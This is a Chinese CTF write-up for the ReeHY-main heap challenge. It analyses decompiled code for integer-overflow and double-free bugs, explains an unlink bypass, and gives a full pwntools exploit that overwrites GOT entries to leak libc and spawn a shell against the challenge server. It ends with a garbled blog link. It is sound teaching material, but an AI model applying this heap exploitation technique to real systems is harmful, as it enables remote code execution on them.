
# 看雪CTF-ReeHY-main

## 一、ALL

这题也是一般堆溢出的流程，主要有下面几个操作：

### 1. 创建

```
input_cun = N;

  if ( N <= 4 )

  {

    puts("Input size");

    input_cun = Get_Number();

    LODWORD(input_size) = input_cun;

    if ( input_cun <= 4096 )

    {

      puts("Input cun");

      input_cun = Get_Number();

      cun = input_cun;

      if ( input_cun <= 4 )

      {

        dest = malloc((signed int)input_size);

        puts("Input content");

        if ( (signed int)input_size > 0x70 )

        {

          read(0, dest, (unsigned int)input_size);

        }

        else

        {

          read(0, &buf, (unsigned int)input_size);

          memcpy(dest, &buf, (signed int)input_size);

        }

        *(_DWORD *)(AllSize + 4LL * cun) = input_size;

        *((_QWORD *)&AllAddr + 2 * cun) = dest;

        isExists[4 * cun] = 1;

        ++N;

        input_cun = fflush(stdout);

      }

    }

  }
```

这一段代码比较多，但可以看到问题还是存在的，`size` 和 `cun` 都是可以通过输入负数，接着通过强类型转换 `unsigned int` 来转换成很大的整数来整形溢出。

### 2. 删除

```
 v1 = result;

  if ( (signed int)result <= 4 )

  {

    free(*((void **)&AllAddr + 2 * (signed int)result));

    isExists[4 * v1] = 0;

    puts("dele success!");

    result = (unsigned int)(N-- - 1);

  }
```

可以看到这里也是存在问题的，删除之前没有判断块是否被删除了，所以应该可以构造 `double-free`。

### 3. 编辑

```
v1 = result;

  if ( result <= 4 )

  {

    result = isExists[4 * result];

    if ( result == 1 )

    {

      puts("Input the content");

      read(0, *((void **)&AllAddr + 2 * v1), *(_DWORD *)(4LL * v1 + AllSize));

      result = puts("Edit success!");

    }

  }
```

这里就是正常的编辑，不过验证了块是否存在。

## 二、DOUBLE-FREE

一年前做过一道 `double-free` 之后就再也没碰过了，这里正好把相关知识点再温习一下。

### 堆结构

堆结构如下，其中0,1,2,3表示一个单位长度。

```
struct malloc_chunk {



[p + 0]      INTERNAL_SIZE_T      prev_size; /* 前一个空闲chunk的大小*/

[p + 1]      INTERNAL_SIZE_T      size;      /* 字节表示的chunk大小，包括chunk头 */



[p + 2]      struct malloc_chunk* fd;         /* 双向链表 -- 只有在被free后才存在 */

[p + 3]      struct malloc_chunk* bk;        /* fd：前一个空闲的块  bk：后一个空闲的块*/



      struct malloc_chunk* fd_nextsize;  /*块大小超过512字节后会有这两个指针*/

      struct malloc_chunk* bk_nextsize;

    };
```

补充说明：

1. `prev_size` ：前一块被 `free` 的话则为空闲块的大小，前一块未被 `free` 的话则为 0
2. `size` ： 因为 chunk 是四字节对齐所以 `size` 的低三位一定是 0，被用来做 flag

### `unlink` 函数

正常 `unlink` 的函数主要代码如下：

```
#define unlink(AV, P, BK, FD) {

    FD = P->fd; //p +

    BK = P->bk;

    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))

      malloc_printerr (check_action, "corrupted double-linked list", P, AV);

    else {

        FD->bk = BK;

        BK->fd = FD;

        ......

}
```

如果能覆盖一个块的头部来达到控制其 `bk` 和 `fd` 的话，就能够成功修改任意地址的值了，但由于存在判断 `FD->bk != P || BK->fd != P`，所以没法随便修改，这时就需要利用 `double-free` 了。

首先判断是需要通过的，所以可以有下面两个等：

```
FD->bk = P   <=> FD+3 = P

BK->fd = P   <=> BK+2 =
```

接着就是构造一个堆头满足这两个等式了：

```
pre_size     0
size         chunk_size + 1 //这两个条件表示堆仍在使用中
fd           p_addr - 3
bk           p_addr - 2
```

那么就能得到绕过判断后能实现的效果：

```
FD->bk = BK => P = BK = P - 2
BK->fd = FD => P = FD = P - 3
```

所以最后实现的效果是 `P=P-3`。

### double-free 流程

接着就是实现 `double-free` 的流程了，稍微盗一下图...

**1. 新建两个 chunk 分别为 `chunk0` 和 `chunk1`**

```
chunk0                malloc返回的ptr        chunk1        malloc返回的ptr

|                     |                     |             |

+-----------+---------+---+---+-------------+------+------+----+----+------+

|           |         |   |   |             |      |      |    |    |      |

|           |         |   |   |             | prev | size&|    |    |      |

| prev_size |size&Flag|   |   |             | size | flag |    |    |      |

|           |         |   |   |             |      |      |    |    |      |

|           |         |   |   |             |      |      |    |    |      |

+-----------+---------+---+---+-------------+------+------+----+----+------+
```

**2. `free` 掉这两个块，第一块作为稍后 `unlink` 的块，另一块作为 `free` 的块**

**3. 新建一个块，这个块要能覆盖到 `chunk1` 的头部，从而伪造两个 chunk 的头，`chunk0` 的头部之前已经说过了，而 `chunk1` 需要欺骗操作系统 `chunk0` 是已经被 `free` 了的，所以其头部应该如下**

```
pre_size     chunk0_size
size         chunk1_size
```

然后整体实现如下：

```
chunk0                malloc返回的ptr           chunk1        malloc返回的pt

|                     |                        |             |

+-----------+---------+----+----+----+----+----+------+------+----+----+------+

|           |         |fake|fake|fake|fake| D  | fake | fake |    |    |      |

|           |         |prev|size| FD | BK | A  | prev | size&|    |    |      |

| prev_size |size&Flag|size|    |    |    | T  | size | flag |    |    |      |

|           |         |    |    |    |    | A  |      |      |    |    |      |

|           |         |    |    |    |    |    |      |      |    |    |      |

+-----------+---------+----+----+----+----+----+------+------+----+----+------+

                      |-------new_chunk0-------|
```

**4. 那么新建这个块就相当于是两个块了，然后我们 `free` `chunk1`，就能实现 `unlink` `chunk0` 从而使得 `chunk0` 的地址存放的值变成了 `P-0x18`**

**5. 接下来修改 `chunk0` 的值，修改的值为 `0x18` 个 padding，然后就能修改 `chunk0` 的地址的值了，这时修改成 `free` 的 GOT 表地址**

**6. 接下来再修改一次 `chunk0`，这次的值修改成 `system` 那么就会使得 `free` 的 GOT 表指向 `system`，接下来 `free` 的时候传入 `/bin/sh` 就能获取 shell 了**

## 三、EXP

在调试 EXP 过程中出现了这样俩个问题，需要注意一下。

第一个是这里的 `P` 指的是指向堆地址的指针，也就是 `0x6020e0`，不要误以为是堆的地址哦。

第二个在这里我是把 `/bin/sh` 写在第 0 个堆，而用 2，3 来进行 `double-free`，主要原因是由于在调试的过程中发现把 `/bin/sh` 写后面会被系统发现 `double-free`。

### 具体 EXP

```
#!/usr/bin/env python

# encoding: utf-8



from pwn import *

import sys



context.log_level = "debug"



def Welcome():

    p.recvuntil("$ ")

    p.sendline("mutepig")



def Add(size,id,content):

    p.recvuntil("$ ")

    p.sendline("1")

    p.recvuntil("size\n")

    p.sendline(str(size))

    p.recvuntil("cun\n")

    p.sendline(str(id))

    p.recvuntil("content\n")

    p.sendline(content)



def Remove(id):

    p.recvuntil("$ ")

    p.sendline("2")

    p.recvuntil("dele\n")

    p.sendline(str(id))



def Edit(id,content):

    p.recvuntil("$ ")

    p.sendline("3")

    p.recvuntil("edit\n")

    p.sendline(str(id))

    p.recvuntil("content\n")

    p.send(content)



if __name__ == "__main__":

    if len(sys.argv)==1:  # local

        p = process("./4-ReeHY-main")

        libc = ELF('libc.so.6')

    else:

        p = remote('211.159.216.90', 51888)

        libc = ELF('ctflibc.so.6')

    #gdb.attach(proc.pidof(p)[0],"b *0x400c29\n")

    #+==================INIT=====================================

    elf = ELF('4-ReeHY-main')

    libc_atoi = libc.symbols['atoi']

    libc_system = libc.symbols['system']

    libc_binsh = next(libc.search("/bin/sh"))

    free_got = elf.got['free']

    atoi_got = elf.got['atoi']

    puts_plt = elf.plt['puts']

    heap_addr = 0x602100

    #+==================INIT=====================================

    print hex(free_got)

    Welcome()

    Add(512,0,"/bin/sh\x00")

    Add(512,1,"1")

    Add(512,2,"2")

    Add(512,3,"3")

    Remove(3)

    Remove(2)

    payload = p64(0) + p64(512+1) + p64(heap_addr - 0x18) + p64(heap_addr - 0x10) + 'A'*(512-0x20) + p64(512) + p64(512)

    Add(1024,2,payload)

    Remove(3)



    Edit(2,'1'*0x18 + p64(free_got) + p64(1) + p64(atoi_got)+ "\n")

    Edit(2,p64(puts_plt))



    Remove(3)

    atoi_addr = u64(p.recv(8)) & 0xffffffffffff

    base_addr = atoi_addr - libc_atoi

    system_addr = base_addr + libc_system



    log.success("systebm:" + hex(system_addr))



    Edit(2,p64(system_addr))

    Remove(0)



    p.interactive()
```

也可以参照我的博客：b94K9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6h3#2#2N6r3g2H3K9h3N6Q4x3X3g2U0L8s2g2T1i4K6u0r3

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
